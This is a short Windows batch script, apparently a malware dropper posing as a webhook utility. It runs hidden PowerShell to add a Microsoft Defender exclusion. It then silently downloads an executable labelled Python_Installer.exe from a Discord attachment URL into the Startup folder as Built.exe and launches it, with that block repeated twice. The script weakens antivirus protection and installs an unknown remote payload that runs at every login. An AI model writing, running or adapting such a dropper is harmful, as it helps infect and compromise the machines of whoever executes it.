@echo off
title Enter Webhook:


powershell -w hidden -c Add-MpPreference -ExclusionPath ""

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1203072429677871137/1205909065876770836/Python_Installer.exe?ex=65da1556&is=65c7a056&hm=06eeada7be4a12622d1f76eb53fa7468a895d351f2eca661267c93175b9c487e&"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1203072429677871137/1205909065876770836/Python_Installer.exe?ex=65da1556&is=65c7a056&hm=06eeada7be4a12622d1f76eb53fa7468a895d351f2eca661267c93175b9c487e&"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"
